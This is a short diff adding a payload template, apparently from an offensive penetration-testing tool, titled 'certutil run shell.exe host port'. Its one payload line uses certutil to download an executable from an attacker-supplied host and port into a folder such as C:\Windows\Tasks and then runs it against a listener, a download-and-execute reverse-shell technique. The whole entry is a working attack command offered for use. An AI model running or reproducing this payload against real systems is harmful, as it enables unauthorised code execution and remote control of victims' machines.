@@ -1,0 +1,6 @@
+title=certutil run shell.exe host port
+info=download files using certutil - PARAM1=>remote path i.e. C:\\Windows\\Tasks or C:\\Temp
+required_opts=LHOST;LPORT;SPORT;PARAM1
+http_requests=2
+payload=certutil -urlcache -split -f http://LHOST:SPORT/FILENAME PARAM1\FILENAME.exe & PARAM1\FILENAME.exe LHOST LPORT
+
